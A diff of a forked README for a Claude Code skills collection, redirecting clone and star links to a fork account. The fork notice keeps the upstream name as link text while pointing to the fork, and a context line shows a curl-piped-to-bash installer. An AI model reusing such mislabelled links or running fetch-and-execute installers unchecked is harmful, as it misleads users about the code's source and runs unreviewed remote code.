@@ -1,6 +1,6 @@
 # Claude Code Skills & Plugins — Agent Skills for Every Coding Tool
 
-> **Fork notice:** This is a personal fork of [alirezarezvani/claude-skills](https://github.com/alirezarezvani/claude-skills) (MIT License, © 2025 Alireza Rezvani). All upstream credit belongs to the original authors. See [LICENSE](LICENSE).
+> **Fork notice:** This is a personal fork of [alirezarezvani/claude-skills](https://github.com/ciciliaETH/claude-skills) (MIT License, © 2025 Alireza Rezvani). All upstream credit belongs to the original authors. See [LICENSE](LICENSE).
 
 **268 production-ready Claude Code skills, plugins, and agent skills for 12 AI coding tools.**
 
@@ -13,7 +13,7 @@ The most comprehensive open-source library of Claude Code skills and agent plugi
 [![Agents](https://img.shields.io/badge/Agents-33-blue?style=for-the-badge)](#agents)
 [![Personas](https://img.shields.io/badge/Personas-7-purple?style=for-the-badge)](#personas)
 [![Commands](https://img.shields.io/badge/Commands-54-orange?style=for-the-badge)](#commands)
-[![Stars](https://img.shields.io/github/stars/alirezarezvani/claude-skills?style=for-the-badge)](https://github.com/alirezarezvani/claude-skills/stargazers)
+[![Stars](https://img.shields.io/github/stars/alirezarezvani/claude-skills?style=for-the-badge)](https://github.com/ciciliaETH/claude-skills/stargazers)
 [![SkillCheck Validated](https://img.shields.io/badge/SkillCheck-Validated-4c1?style=for-the-badge)](https://getskillcheck.com)
 
 > **5,200+ GitHub stars** — the most comprehensive open-source Claude Code skills & agent plugins library.
@@ -49,7 +49,7 @@ All three work together. See [Orchestration](#orchestration) for how to combine 
 
 ```bash
 # Clone the repository
-git clone https://github.com/alirezarezvani/claude-skills.git
+git clone https://github.com/ciciliaETH/claude-skills.git
 cd claude-skills
 
 # Run the setup script
@@ -99,7 +99,7 @@ bash <(curl -s https://raw.githubusercontent.com/alirezarezvani/claude-skills/ma
 ### Manual Installation
 
 ```bash
-git clone https://github.com/alirezarezvani/claude-skills.git
+git clone https://github.com/ciciliaETH/claude-skills.git
 # Copy any skill folder to ~/.claude/skills/ (Claude Code) or ~/.codex/skills/ (Codex)
 ```
 
